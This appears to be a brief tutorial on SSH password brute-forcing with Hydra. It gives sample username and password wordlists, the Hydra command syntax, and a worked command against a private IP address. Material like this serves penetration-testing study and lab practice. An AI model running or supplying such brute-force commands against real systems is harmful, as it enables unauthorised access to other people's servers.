1. **Prepare your wordlists.** Create or download text files containing potential usernames and passwords. For example:
    1. username.txt:
        ```
        text
        root
        admin
        user
        test
        ```
    2. password.txt:
        ```
        text
        password
        123456
        changeme
        qwerty
        ```
2. **Construct the Hydra command.** The basic command syntax for SSH brute-forcing with Hydra is:

```hydra -L <userlist.txt> -P <passlist.txt> <target_ip> ssh```
(small l for single user, L for list, same with p (password))

3. Run the command. Execute the command in your terminal, replacing the placeholders with your actual file names and the target IP address.Example: ```hydra -L username.txt -P password.txt 192.168.1.11 ssh```


What is hydra?
Password-cracking tool that does dictionary and brute-force and hybrid attacks